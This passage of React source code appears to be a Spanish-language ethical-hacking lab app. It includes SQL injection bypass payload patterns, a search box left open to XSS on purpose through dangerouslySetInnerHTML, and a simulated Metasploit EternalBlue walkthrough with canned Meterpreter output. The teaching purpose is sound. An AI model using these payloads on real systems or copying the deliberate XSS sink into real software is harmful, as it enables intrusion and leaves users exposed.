      {hist.map((l,i)=><div key={i} style={{ color:cols[l.t]||"#cdd6f4",marginBottom:2,whiteSpace:"pre-wrap",wordBreak:"break-all" }}>{l.v}</div>)}
      <div style={{ display:"flex",alignItems:"center",marginTop:4 }}>
        <span style={{ color:"#64ffda",marginRight:8,flexShrink:0,fontSize:12 }}>{cwd.replace("/home/hacker","~")}$</span>
        <input ref={inputRef} value={input} onChange={e=>setInput(e.target.value)}
          onKeyDown={e=>{ if(e.key==="Enter"){ run(input); setInput(""); }}}
          style={{ background:"transparent",border:"none",outline:"none",color:"#a8ff78",fontFamily:"inherit",fontSize:13,flex:1 }} autoFocus/>
      </div>
      <div ref={endRef}/>
    </div>
  );
}

/* ─── QUIZ ─── */
function Quiz({ task, onSuccess }) {
  const [sel,setSel]=useState(null); const [ans,setAns]=useState(false);
  const ch=task.challenge;
  const check=()=>{ setAns(true); if(sel===ch.correct) setTimeout(()=>onSuccess(ch.flag),900); };
  return (
    <div>
      <p style={{ color:"#cdd6f4",fontSize:13,marginBottom:14,lineHeight:1.7 }}>{ch.question}</p>
      {ch.options.map((opt,i)=>{
        let bg="rgba(255,255,255,0.03)",border="1px solid rgba(255,255,255,0.08)",color="#cdd6f4";
        if(ans&&i===ch.correct){bg="rgba(100,255,218,0.12)";border="1px solid #64ffda";color="#64ffda";}
        if(ans&&sel===i&&i!==ch.correct){bg="rgba(255,107,107,0.12)";border="1px solid #ff6b6b";color="#ff6b6b";}
        if(!ans&&sel===i){bg="rgba(100,255,218,0.06)";border="1px solid rgba(100,255,218,0.4)";}
        return (
          <div key={i} onClick={()=>!ans&&setSel(i)} style={{ background:bg,border,borderRadius:8,padding:"10px 14px",marginBottom:8,cursor:ans?"default":"pointer",color,transition:"all 0.2s",display:"flex",gap:10,alignItems:"flex-start" }}>
            <span style={{ opacity:0.4,fontSize:12,flexShrink:0,marginTop:1 }}>{["A","B","C","D"][i]}.</span>
            <span style={{ fontSize:13,lineHeight:1.5 }}>{opt}</span>
          </div>
        );
      })}
      {ans&&ch.explanation&&<div style={{ background:"rgba(100,255,218,0.05)",border:"1px solid rgba(100,255,218,0.2)",borderRadius:8,padding:"10px 14px",marginTop:8,color:"#7a8ba8",fontSize:12,lineHeight:1.6 }}>💡 {ch.explanation}</div>}
      {!ans&&<button onClick={check} disabled={sel===null} style={{ marginTop:10,padding:"8px 22px",background:sel!==null?"#64ffda":"#1a2a3a",color:sel!==null?"#080d16":"#4a6a8a",border:"none",borderRadius:6,cursor:sel!==null?"pointer":"default",fontWeight:700,fontFamily:"inherit",fontSize:13,transition:"all 0.2s" }}>Verificar</button>}
    </div>
  );
}

/* ─── LOGIN BYPASS ─── */
function LoginBypass({ task, onSuccess }) {
  const [user,setUser]=useState(""); const [pass,setPass]=useState(""); const [res,setRes]=useState(null);
  const ch=task.challenge;
  const tryLogin=()=>{
    const patterns=["'--","' --","or 1=1","or '1'='1","'#","or 1=1#","admin'"];
    if(patterns.some(p=>user.toLowerCase().includes(p))){ setRes("ok"); setTimeout(()=>onSuccess(ch.flag),900); }
    else setRes("fail");
  };
  const iStyle={ width:"100%",background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:6,padding:"8px 11px",color:"#cdd6f4",fontFamily:"'JetBrains Mono',monospace",fontSize:12,outline:"none" };
  return (
    <div>
      <p style={{ color:"#7a8ba8",fontSize:12,marginBottom:16,lineHeight:1.6 }}>{ch.desc}</p>
      <div style={{ background:"#070b14",border:"1px solid #1a3050",borderRadius:10,padding:22,maxWidth:340 }}>
        <div style={{ textAlign:"center",color:"#ff6b6b",marginBottom:16,fontSize:13,fontWeight:700 }}>🔒 RESTRICTED AREA</div>
        <div style={{ marginBottom:10 }}><label style={{ color:"#7a8ba8",fontSize:11,display:"block",marginBottom:4 }}>Usuario</label><input value={user} onChange={e=>setUser(e.target.value)} onKeyDown={e=>e.key==="Enter"&&tryLogin()} style={iStyle} placeholder="admin"/></div>
        <div style={{ marginBottom:14 }}><label style={{ color:"#7a8ba8",fontSize:11,display:"block",marginBottom:4 }}>Contraseña</label><input value={pass} onChange={e=>setPass(e.target.value)} type="password" onKeyDown={e=>e.key==="Enter"&&tryLogin()} style={iStyle} placeholder="••••••••"/></div>
        {res==="fail"&&<div style={{ color:"#ff6b6b",fontSize:11,marginBottom:8 }}>❌ Credenciales inválidas</div>}
        {res==="ok"&&<div style={{ color:"#64ffda",fontSize:11,marginBottom:8 }}>✅ ¡Acceso concedido! SQL Injection exitoso</div>}
        <button onClick={tryLogin} style={{ width:"100%",padding:8,background:"#1a3050",color:"#64ffda",border:"1px solid #1e4070",borderRadius:6,cursor:"pointer",fontWeight:700,fontFamily:"inherit",fontSize:12 }}>Iniciar sesión</button>
      </div>
      <div style={{ marginTop:12,color:"#4a6a8a",fontSize:11 }}>🔍 Query: <code style={{ color:"#ffd93d" }}>SELECT * FROM users WHERE user='$user' AND pass='$pass'</code></div>
    </div>
  );
}

/* ─── XSS ─── */
function XSSChallenge({ task, onSuccess }) {
  const [val,setVal]=useState(""); const [sub,setSub]=useState(false); const [alertMsg,setAlertMsg]=useState(null);
  const ch=task.challenge;
  const check=()=>{
    setSub(true);
    if(ch.xssPatterns.some(p=>val.toLowerCase().includes(p))){
      const m=val.match(/alert\(([^)]+)\)/); setAlertMsg(m?m[1].replace(/['"]/g,""):"XSS");
      setTimeout(()=>onSuccess(ch.flag),1500);
    }
  };
  return (
    <div>
      <p style={{ color:"#7a8ba8",fontSize:12,marginBottom:14 }}>{ch.desc}</p>
      {alertMsg&&(
        <div style={{ position:"fixed",top:"50%",left:"50%",transform:"translate(-50%,-50%)",background:"#fff",color:"#000",padding:"24px 40px",borderRadius:8,zIndex:9999,boxShadow:"0 0 60px rgba(0,0,0,0.9)",textAlign:"center",fontFamily:"Arial" }}>
          <div style={{ fontSize:14,marginBottom:8 }}>Esta página dice:</div>
          <div style={{ fontSize:24,fontWeight:700,margin:"10px 0" }}>{alertMsg}</div>
          <button onClick={()=>setAlertMsg(null)} style={{ marginTop:10,padding:"6px 22px",background:"#0078d7",color:"#fff",border:"none",borderRadius:4,cursor:"pointer" }}>Aceptar</button>
        </div>
      )}
      <div style={{ background:"#070b14",border:"1px solid #1a3050",borderRadius:10,padding:18 }}>
        <div style={{ color:"#64ffda",marginBottom:10,fontSize:12,fontWeight:700 }}>🛒 Tienda — Buscar productos</div>
        <div style={{ display:"flex",gap:8 }}>
          <input value={val} onChange={e=>setVal(e.target.value)} placeholder="Buscar..." style={{ flex:1,background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:6,padding:"7px 11px",color:"#cdd6f4",fontFamily:"'JetBrains Mono',monospace",fontSize:12,outline:"none" }} onKeyDown={e=>e.key==="Enter"&&check()}/>
          <button onClick={check} style={{ padding:"7px 16px",background:"#64ffda",color:"#080d16",border:"none",borderRadius:6,cursor:"pointer",fontWeight:700,fontSize:12,fontFamily:"inherit" }}>Buscar</button>
        </div>
        {sub&&!alertMsg&&<div style={{ marginTop:10,color:"#cdd6f4",fontSize:12 }}>Resultados para: <span style={{ color:"#ff6b6b" }} dangerouslySetInnerHTML={{ __html:val }}/></div>}
      </div>
    </div>
  );
}

/* ─── HASH CRACK ─── */
function HashCrack({ task, onSuccess }) {
  const [hashT,setHashT]=useState(""); const [ans,setAns]=useState(""); const [res,setRes]=useState(null);
  const ch=task.challenge;
  const check=()=>{
    if(ans.toLowerCase()===ch.answer.toLowerCase()&&hashT.toUpperCase()===ch.hashType){ setRes("ok"); setTimeout(()=>onSuccess(ch.flag),800); }
    else setRes("fail");
  };
  const iStyle={ width:"100%",background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:6,padding:"7px 11px",color:"#cdd6f4",fontFamily:"'JetBrains Mono',monospace",fontSize:12,outline:"none" };
  return (
    <div>
      <div style={{ background:"#070b14",border:"1px solid rgba(255,217,61,0.3)",borderRadius:8,padding:14,marginBottom:14 }}>
        <div style={{ color:"#7a8ba8",fontSize:10,marginBottom:4 }}>HASH INTERCEPTADO:</div>
        <div style={{ color:"#ffd93d",fontFamily:"monospace",fontSize:13,wordBreak:"break-all" }}>{ch.hash}</div>
      </div>
      <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:12 }}>
        <div><label style={{ color:"#7a8ba8",fontSize:10,display:"block",marginBottom:4 }}>Tipo de hash</label><input value={hashT} onChange={e=>setHashT(e.target.value)} placeholder="MD5, SHA1..." style={iStyle}/></div>
        <div><label style={{ color:"#7a8ba8",fontSize:10,display:"block",marginBottom:4 }}>Contraseña original</label><input value={ans} onChange={e=>setAns(e.target.value)} placeholder="Contraseña..." style={iStyle} onKeyDown={e=>e.key==="Enter"&&check()}/></div>
      </div>
      {res==="fail"&&<div style={{ color:"#ff6b6b",fontSize:11,marginBottom:8 }}>❌ Incorrecto. {ch.hint}</div>}
      {res==="ok"&&<div style={{ color:"#64ffda",fontSize:11,marginBottom:8 }}>✅ ¡Hash crackeado!</div>}
      <button onClick={check} style={{ padding:"8px 22px",background:"#64ffda",color:"#080d16",border:"none",borderRadius:6,cursor:"pointer",fontWeight:700,fontFamily:"inherit",fontSize:13 }}>Verificar</button>
    </div>
  );
}

/* ─── CAESAR ─── */
function CaesarChallenge({ task, onSuccess }) {
  const [ans,setAns]=useState(""); const [res,setRes]=useState(null);
  const ch=task.challenge;
  const rot13=s=>s.replace(/[a-zA-Z]/g,c=>{ const b=c<="Z"?65:97; return String.fromCharCode(((c.charCodeAt(0)-b+13)%26)+b); });
  const check=()=>{
    if(ans.toUpperCase()===ch.answer.toUpperCase()||ans.toUpperCase()===ch.flag.toUpperCase()){ setRes("ok"); setTimeout(()=>onSuccess(ch.flag),800); }
    else setRes("fail");
  };
  return (
    <div>
      <p style={{ color:"#cdd6f4",fontSize:13,marginBottom:12 }}>{ch.prompt}</p>
      <div style={{ background:"#070b14",border:"1px solid rgba(168,255,120,0.3)",borderRadius:8,padding:14,marginBottom:14 }}>
        <div style={{ color:"#7a8ba8",fontSize:10,marginBottom:4 }}>MENSAJE CIFRADO (ROT13):</div>
        <div style={{ color:"#a8ff78",fontFamily:"monospace",fontSize:16,letterSpacing:2 }}>{ch.ciphertext}</div>
      </div>
      <div style={{ background:"rgba(255,255,255,0.02)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:8,padding:12,marginBottom:14 }}>
        <div style={{ color:"#7a8ba8",fontSize:10,marginBottom:8 }}>TABLA ROT13:</div>
        <div style={{ display:"flex",flexWrap:"wrap",gap:6 }}>
          {"ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("").map(c=>(
            <div key={c} style={{ textAlign:"center",minWidth:26 }}>
              <div style={{ color:"#64ffda",fontSize:10 }}>{c}</div>
              <div style={{ color:"#555",fontSize:8 }}>↕</div>
              <div style={{ color:"#a8ff78",fontSize:10 }}>{rot13(c)}</div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ display:"flex",gap:8,alignItems:"center" }}>
        <input value={ans} onChange={e=>setAns(e.target.value)} placeholder="Escribe el mensaje descifrado..." onKeyDown={e=>e.key==="Enter"&&check()} style={{ flex:1,background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:6,padding:"8px 11px",color:"#cdd6f4",fontFamily:"'JetBrains Mono',monospace",fontSize:12,outline:"none" }}/>
        <button onClick={check} style={{ padding:"8px 18px",background:"#a8ff78",color:"#080d16",border:"none",borderRadius:6,cursor:"pointer",fontWeight:700,fontFamily:"inherit",fontSize:12 }}>Descifrar</button>
      </div>
      {res==="fail"&&<div style={{ color:"#ff6b6b",fontSize:11,marginTop:8 }}>❌ Incorrecto. {ch.hint}</div>}
      {res==="ok"&&<div style={{ color:"#64ffda",fontSize:11,marginTop:8 }}>✅ ¡Mensaje descifrado!</div>}
    </div>
  );
}

/* ─── MSF TERMINAL ─── */
function MSFTerminal({ task, onSuccess }) {
  const [hist,setHist]=useState([{ t:"sys",v:"       =[ metasploit v6.3.44-dev ]" },{ t:"sys",v:"+ -- --=[ 2356 exploits - 1220 auxiliary ]" },{ t:"out",v:"msf6 > " }]);
  const [input,setInput]=useState(""); const [step,setStep]=useState(0); const [solved,setSolved]=useState(false);
  const endRef=useRef(null); const inputRef=useRef(null);
  useEffect(()=>{ endRef.current?.scrollIntoView({ behavior:"smooth" }); },[hist]);

  const steps=[
    { exp:["search eternalblue","search ms17-010","search ms17_010"], res:["Matching Modules","=================","  #  Name                                           Rank","  0  exploit/windows/smb/ms17_010_eternalblue       great","","Hint: escribe 'use 0' para seleccionar el módulo"] },
    { exp:["use 0","use exploit/windows/smb/ms17_010_eternalblue","use exploit/windows/smb/ms17_010"], res:["msf6 exploit(ms17_010_eternalblue) > ","Módulo seleccionado correctamente.","Hint: ahora escribe 'set RHOSTS 10.10.10.40'"] },
    { exp:["set rhosts 10.10.10.40","set rhost 10.10.10.40"], res:["RHOSTS => 10.10.10.40","Hint: ahora escribe 'run' para ejecutar el exploit"] },
    { exp:["run","exploit"], res:["[*] Started reverse TCP handler on 0.0.0.0:4444","[*] 10.10.10.40:445 - Exploiting target...","[+] 10.10.10.40:445 - =-=-=-=-=-=-= (Pwned!) =-=-=-=-=-=-=","[*] Meterpreter session 1 opened (10.10.14.1:4444 → 10.10.10.40:49152)","meterpreter > "] },
  ];

  const runMsf=(raw)=>{
    const cmd=raw.trim().toLowerCase();
    setHist(h=>[...h,{ t:"inp",v:`msf6 > ${raw}` }]);
    if(!cmd) return;
    if(cmd==="help"){ setHist(h=>[...h,{ t:"out",v:"Comandos: search, use, set, show options, run, exit" }]); return; }
    if(solved){ setHist(h=>[...h,{ t:"ok",v:"Ya completaste este desafío." }]); return; }
    const s=steps[step];
    if(s&&s.exp.some(e=>cmd.includes(e.split(" ").pop())||cmd===e)){
      s.res.forEach(l=>setHist(h=>[...h,{ t:"out",v:l }]));
      if(step===steps.length-1){ setSolved(true); setHist(h=>[...h,{ t:"ok",v:"✅ ¡Máquina pwneada! Flag obtenida." }]); setTimeout(()=>onSuccess(task.challenge.flag),1000); }
      else setStep(p=>p+1);
    } else {
      setHist(h=>[...h,{ t:"err",v:`[-] Comando no reconocido: ${raw}` }]);
      if(step===0) setHist(h=>[...h,{ t:"out",v:"Hint: escribe 'search eternalblue'" }]);
    }
  };

  const cols={ sys:"#64ffda",inp:"#ffd93d",out:"#cdd6f4",err:"#ff6b6b",ok:"#a8ff78" };
  return (
    <div onClick={()=>inputRef.current?.focus()} style={{ background:"#050810",border:"1px solid #1a3050",borderRadius:8,fontFamily:"'JetBrains Mono',monospace",fontSize:12,padding:16,minHeight:260,maxHeight:320,overflowY:"auto",cursor:"text" }}>
      <div style={{ display:"flex",gap:6,marginBottom:10 }}>
        {["#ff5f57","#febc2e","#28c840"].map(c=><div key={c} style={{ width:10,height:10,borderRadius:"50%",background:c }}/>)}
        <span style={{ color:"#3a5a7a",fontSize:10,marginLeft:8 }}>msfconsole — Metasploit Framework</span>
      </div>
      {hist.map((l,i)=><div key={i} style={{ color:cols[l.t]||"#cdd6f4",marginBottom:2,whiteSpace:"pre-wrap" }}>{l.v}</div>)}
      <div style={{ display:"flex",alignItems:"center",marginTop:4 }}>
        <input ref={inputRef} value={input} onChange={e=>setInput(e.target.value)} onKeyDown={e=>{ if(e.key==="Enter"){ runMsf(input); setInput(""); }}}
          style={{ background:"transparent",border:"none",outline:"none",color:"#ffd93d",fontFamily:"inherit",fontSize:12,flex:1 }} autoFocus/>
      </div>
      <div ref={endRef}/>
    </div>
  );
}

/* ─── FINAL CTF ─── */
function FinalCTF({ task, onSuccess }) {
  const [step,setStep]=useState(0); const [sel,setSel]=useState(null); const [ans,setAns]=useState(false);
  const ch=task.challenge; const s=ch.steps[step];
  const check=()=>{
    setAns(true);
    if(sel===s.correct){
      setTimeout(()=>{
        if(step<ch.steps.length-1){ setStep(p=>p+1); setSel(null); setAns(false); }
        else onSuccess(ch.flag);
      },1400);
    }
  };
  return (
    <div>
      <div style={{ display:"flex",gap:8,marginBottom:16 }}>
        {ch.steps.map((_,i)=>(
          <div key={i} style={{ flex:1,height:4,borderRadius:2,background:i<step?"#64ffda":i===step?"#ffd93d":"rgba(255,255,255,0.1)" }}/>
        ))}
      </div>
      <div style={{ color:"#7a8ba8",fontSize:11,marginBottom:8 }}>PASO {step+1} DE {ch.steps.length}</div>
      <p style={{ color:"#cdd6f4",fontSize:13,marginBottom:14,lineHeight:1.7 }}>{s.q}</p>
      {s.options.map((opt,i)=>{
        let bg="rgba(255,255,255,0.03)",border="1px solid rgba(255,255,255,0.08)",color="#cdd6f4";
        if(ans&&i===s.correct){bg="rgba(100,255,218,0.12)";border="1px solid #64ffda";color="#64ffda";}
        if(ans&&sel===i&&i!==s.correct){bg="rgba(255,107,107,0.12)";border="1px solid #ff6b6b";color="#ff6b6b";}
        if(!ans&&sel===i){bg="rgba(100,255,218,0.06)";border="1px solid rgba(100,255,218,0.4)";}
        return (
          <div key={i} onClick={()=>!ans&&setSel(i)} style={{ background:bg,border,borderRadius:8,padding:"9px 13px",marginBottom:8,cursor:ans?"default":"pointer",color,transition:"all 0.2s",display:"flex",gap:10,alignItems:"flex-start",fontSize:12,lineHeight:1.5 }}>
            <span style={{ opacity:0.4,fontSize:11,flexShrink:0 }}>{["A","B","C","D"][i]}.</span> {opt}
          </div>
        );
      })}
      {ans&&<div style={{ background:"rgba(100,255,218,0.05)",border:"1px solid rgba(100,255,218,0.2)",borderRadius:8,padding:"10px 14px",marginBottom:10,color:"#7a8ba8",fontSize:11,lineHeight:1.6 }}>💡 {s.exp}</div>}
      {!ans&&<button onClick={check} disabled={sel===null} style={{ marginTop:6,padding:"7px 20px",background:sel!==null?"#64ffda":"#1a2a3a",color:sel!==null?"#080d16":"#4a6a8a",border:"none",borderRadius:6,cursor:sel!==null?"pointer":"default",fontWeight:700,fontFamily:"inherit",fontSize:12 }}>Verificar</button>}
    </div>
  );
}

/* ─── AI ASSISTANT ─── */
function AIAssistant({ context }) {
  const [msgs,setMsgs]=useState([]); const [input,setInput]=useState(""); const [loading,setLoading]=useState(false); const [open,setOpen]=useState(false);
  const endRef=useRef(null);
  useEffect(()=>{ endRef.current?.scrollIntoView({ behavior:"smooth" }); },[msgs]);
  const ask=async()=>{
    if(!input.trim()||loading) return;
    const txt=input.trim(); setInput(""); setLoading(true);
    setMsgs(m=>[...m,{ r:"user",t:txt }]);
    try {
      const res=await fetch("https://api.anthropic.com/v1/messages",{ method:"POST",headers:{"Content-Type":"application/json"},
        body:JSON.stringify({ model:"claude-sonnet-4-20250514",max_tokens:1000,
          system:`Eres instructor experto de ciberseguridad en plataforma educativa. Contexto del estudiante: "${context}". Responde SIEMPRE en español. Sé técnico pero didáctico, usa ejemplos reales. NUNCA des flags o respuestas exactas — solo pistas. Máximo 180 palabras.`,
          messages:[...msgs.map(m=>({ role:m.r==="user"?"user":"assistant",content:m.t })),{ role:"user",content:txt }],
        }),
      });
      const data=await res.json();
      setMsgs(m=>[...m,{ r:"assistant",t:data.content?.[0]?.text||"Error de conexión." }]);
    } catch { setMsgs(m=>[...m,{ r:"assistant",t:"Error al conectar." }]); }
    setLoading(false);
  };
  if(!open) return <button onClick={()=>setOpen(true)} title="Asistente IA" style={{ position:"fixed",bottom:24,right:24,background:"linear-gradient(135deg,#64ffda,#00b4d8)",color:"#080d16",border:"none",borderRadius:"50%",width:52,height:52,cursor:"pointer",fontSize:22,boxShadow:"0 4px 24px rgba(100,255,218,0.4)",zIndex:100 }}>🤖</button>;
  return (
    <div style={{ position:"fixed",bottom:24,right:24,width:320,background:"#0a0f1a",border:"1px solid #1a3050",borderRadius:12,boxShadow:"0 8px 40px rgba(0,0,0,0.7)",zIndex:100,fontFamily:"inherit" }}>
      <div style={{ display:"flex",justifyContent:"space-between",alignItems:"center",padding:"11px 16px",borderBottom:"1px solid #1a3050",background:"linear-gradient(135deg,rgba(100,255,218,0.08),rgba(0,180,216,0.08))",borderRadius:"12px 12px 0 0" }}>
        <span style={{ color:"#64ffda",fontWeight:700,fontSize:12 }}>🤖 Asistente CyberSec</span>
        <button onClick={()=>setOpen(false)} style={{ background:"none",border:"none",color:"#4a6a8a",cursor:"pointer",fontSize:16 }}>✕</button>
      </div>
      <div style={{ height:200,overflowY:"auto",padding:12 }}>
        {msgs.length===0&&<div style={{ color:"#3a5a7a",fontSize:12,textAlign:"center",marginTop:24,lineHeight:1.6 }}>Pregúntame sobre el desafío. Te daré pistas pero no las respuestas directas.</div>}
        {msgs.map((m,i)=>(
          <div key={i} style={{ marginBottom:10 }}>
            <div style={{ color:m.r==="user"?"#ffd93d":"#64ffda",fontSize:10,marginBottom:3 }}>{m.r==="user"?"Tú":"Asistente"}</div>
            <div style={{ color:"#cdd6f4",fontSize:11,lineHeight:1.6,background:m.r==="user"?"rgba(255,217,61,0.05)":"rgba(100,255,218,0.04)",borderRadius:6,padding:"7px 10px" }}>{m.t}</div>
          </div>
        ))}
        {loading&&<div style={{ color:"#64ffda",fontSize:11 }}>Pensando...</div>}
        <div ref={endRef}/>
      </div>
      <div style={{ display:"flex",gap:6,padding:"8px 12px",borderTop:"1px solid #1a3050" }}>
        <input value={input} onChange={e=>setInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&ask()} placeholder="Pide una pista..." style={{ flex:1,background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:6,padding:"6px 10px",color:"#cdd6f4",fontSize:11,outline:"none",fontFamily:"inherit" }}/>
        <button onClick={ask} disabled={loading} style={{ padding:"6px 12px",background:"#64ffda",color:"#080d16",border:"none",borderRadius:6,cursor:"pointer",fontWeight:700,fontSize:12 }}>→</button>
      </div>
    </div>
  );
}

/* ─── APP PRINCIPAL ─── */
export default function App() {
  const [screen,setScreen]=useState("home");
  const [room,setRoom]=useState(null);
  const [taskIdx,setTaskIdx]=useState(0);
  const [completed,setCompleted]=useState({});
  const [flagModal,setFlagModal]=useState(null);
  const [showHint,setShowHint]=useState(false);
  const [xp,setXP]=useState(0);

  const handleSuccess=(f)=>{
    const key=`${room.id}-${room.tasks[taskIdx].id}`;
    if(!completed[key]){ setCompleted(c=>({...c,[key]:true})); setXP(x=>x+Math.floor(room.xp/room.tasks.length)); }
    setFlagModal(f);
  };

  const prog=(r)=>{ const done=r.tasks.filter(t=>completed[`${r.id}-${t.id}`]).length; return { done,total:r.tasks.length,pct:Math.round((done/r.tasks.length)*100) }; };
  const totalTasks=ROOMS.reduce((a,r)=>a+r.tasks.length,0);
  const doneTasks=Object.keys(completed).length;
  const level=Math.floor(xp/200)+1;
  const diffColor={ Fácil:"#64ffda",Medio:"#ffd93d",Difícil:"#ff6b6b" };

  const BASE={ minHeight:"100vh",background:"#080d16",color:"#cdd6f4",fontFamily:"'JetBrains Mono','Fira Code','Courier New',monospace" };
  const CSS=`@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&display=swap');
    ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#080d16}::-webkit-scrollbar-thumb{background:#1a3050;border-radius:2px}
    @keyframes fadeIn{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
    *{box-sizing:border-box}`;

  const parseTheory=(text)=>text.split(/(\*\*[^*]+\*\*|`[^`]+`|```[\s\S]*?```)/).map((part,i)=>{
    if(part.startsWith("**")&&part.endsWith("**")) return <strong key={i} style={{ color:"#64ffda" }}>{part.slice(2,-2)}</strong>;
    if(part.startsWith("`")&&!part.startsWith("```")) return <code key={i} style={{ background:"rgba(100,255,218,0.1)",color:"#a8ff78",padding:"1px 5px",borderRadius:3,fontSize:12 }}>{part.slice(1,-1)}</code>;
    if(part.startsWith("```")){ const code=part.replace(/```\w*\n?/,"").replace(/```$/,""); return <pre key={i} style={{ background:"#070b14",border:"1px solid #1a3050",borderRadius:6,padding:12,color:"#a8ff78",fontSize:12,overflowX:"auto",margin:"10px 0",lineHeight:1.6 }}>{code}</pre>; }
    return <span key={i}>{part}</span>;
  });

  if(screen==="home") return (
    <div style={BASE}>
      <style>{CSS}</style>
      <div style={{ position:"fixed",top:0,left:0,right:0,bottom:0,background:"repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.015) 2px,rgba(0,0,0,0.015) 4px)",pointerEvents:"none",zIndex:0 }}/>
      <div style={{ position:"relative",zIndex:1,maxWidth:940,margin:"0 auto",padding:"40px 20px" }}>
        <div style={{ textAlign:"center",marginBottom:44 }}>
          <div style={{ display:"inline-flex",alignItems:"center",gap:8,background:"rgba(100,255,218,0.08)",border:"1px solid rgba(100,255,218,0.25)",borderRadius:20,padding:"4px 16px",marginBottom:18,fontSize:11 }}>
            <span style={{ color:"#64ffda",animation:"pulse 2s infinite" }}>●</span>
            <span style={{ color:"#64ffda" }}>ENTORNO DE LAB ACTIVO</span>
          </div>
          <h1 style={{ fontFamily:"'Orbitron',monospace",fontSize:"clamp(26px,5vw,48px)",fontWeight:900,background:"linear-gradient(135deg,#64ffda 0%,#00b4d8 50%,#7c3aed 100%)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent",margin:0,lineHeight:1.1 }}>CYBERSEC LAB</h1>
          <p style={{ color:"#3a5a7a",fontSize:12,marginTop:10 }}>Aprende hacking ético con laboratorios interactivos + IA • {ROOMS.length} rooms • {totalTasks} desafíos</p>
          <div style={{ display:"flex",justifyContent:"center",gap:12,marginTop:20,flexWrap:"wrap" }}>
            {[{ label:"NIVEL",value:level,color:"#7c3aed" },{ label:"XP",value:xp,color:"#ffd93d" },{ label:"TAREAS",value:`${doneTasks}/${totalTasks}`,color:"#64ffda" },{ label:"ROOMS",value:`${ROOMS.filter(r=>prog(r).pct===100).length}/${ROOMS.length}`,color:"#a8ff78" }].map(s=>(
              <div key={s.label} style={{ background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.07)",borderRadius:10,padding:"10px 20px",textAlign:"center",minWidth:80 }}>
                <div style={{ color:s.color,fontSize:20,fontWeight:700 }}>{s.value}</div>
                <div style={{ color:"#3a5a7a",fontSize:10,marginTop:2 }}>{s.label}</div>
              </div>
            ))}
          </div>
          <div style={{ maxWidth:300,margin:"12px auto 0" }}>
            <div style={{ height:3,background:"rgba(255,255,255,0.06)",borderRadius:2 }}>
              <div style={{ height:"100%",width:`${(xp%200)/2}%`,background:"linear-gradient(90deg,#7c3aed,#64ffda)",borderRadius:2,transition:"width 0.5s" }}/>
            </div>
            <div style={{ color:"#3a5a7a",fontSize:10,marginTop:4 }}>{xp%200}/200 XP para nivel {level+1}</div>
          </div>
        </div>
        <div style={{ display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(260px,1fr))",gap:14 }}>
          {ROOMS.map(r=>{ const p=prog(r); return (
            <div key={r.id} onClick={()=>{ setRoom(r); setTaskIdx(0); setFlagModal(null); setShowHint(false); setScreen("room"); }}
              style={{ background:"rgba(255,255,255,0.02)",border:`1px solid ${p.pct===100?"rgba(100,255,218,0.35)":"rgba(255,255,255,0.06)"}`,borderRadius:12,padding:20,cursor:"pointer",transition:"all 0.22s",position:"relative",overflow:"hidden" }}
              onMouseEnter={e=>{ e.currentTarget.style.background="rgba(100,255,218,0.04)"; e.currentTarget.style.transform="translateY(-2px)"; }}
              onMouseLeave={e=>{ e.currentTarget.style.background="rgba(255,255,255,0.02)"; e.currentTarget.style.transform="translateY(0)"; }}
            >
              {p.pct===100&&<div style={{ position:"absolute",top:12,right:12,background:"rgba(100,255,218,0.15)",border:"1px solid rgba(100,255,218,0.4)",borderRadius:"50%",width:24,height:24,display:"flex",alignItems:"center",justifyContent:"center",color:"#64ffda",fontSize:12 }}>✓</div>}
              <div style={{ fontSize:30,marginBottom:10 }}>{r.icon}</div>
              <div style={{ color:"#e0e0e0",fontWeight:700,fontSize:14,marginBottom:5 }}>{r.title}</div>
              <div style={{ color:"#4a6a8a",fontSize:11,marginBottom:12,lineHeight:1.6 }}>{r.desc}</div>
              <div style={{ display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:10 }}>
                <span style={{ color:diffColor[r.diff],fontSize:11,background:`${diffColor[r.diff]}18`,padding:"2px 10px",borderRadius:10 }}>{r.diff}</span>
                <span style={{ color:"#ffd93d",fontSize:11 }}>+{r.xp} XP</span>
              </div>
              <div style={{ height:3,background:"rgba(255,255,255,0.06)",borderRadius:2 }}>
                <div style={{ height:"100%",width:`${p.pct}%`,background:p.pct===100?"#64ffda":"linear-gradient(90deg,#64ffda,#00b4d8)",borderRadius:2,transition:"width 0.5s" }}/>
              </div>
              <div style={{ color:"#3a5a7a",fontSize:10,marginTop:5 }}>{p.done}/{p.total} tareas completadas</div>
            </div>
          ); })}
        </div>
      </div>
      <AIAssistant context="introducción a ciberseguridad — página principal"/>
    </div>
  );

  if(screen==="room") return (
    <div style={BASE}>
      <style>{CSS}</style>
      <div style={{ maxWidth:780,margin:"0 auto",padding:"30px 20px" }}>
        <button onClick={()=>setScreen("home")} style={{ background:"none",border:"1px solid rgba(255,255,255,0.08)",borderRadius:6,color:"#4a6a8a",padding:"6px 14px",cursor:"pointer",fontSize:11,marginBottom:24,fontFamily:"inherit" }}>← Volver al inicio</button>
        <div style={{ display:"flex",alignItems:"center",gap:16,marginBottom:8 }}>
          <span style={{ fontSize:34 }}>{room.icon}</span>
          <div>
            <h2 style={{ fontFamily:"'Orbitron',monospace",color:"#64ffda",margin:0,fontSize:20 }}>{room.title}</h2>
            <p style={{ color:"#3a5a7a",margin:"4px 0 0",fontSize:12 }}>{room.desc}</p>
          </div>
        </div>
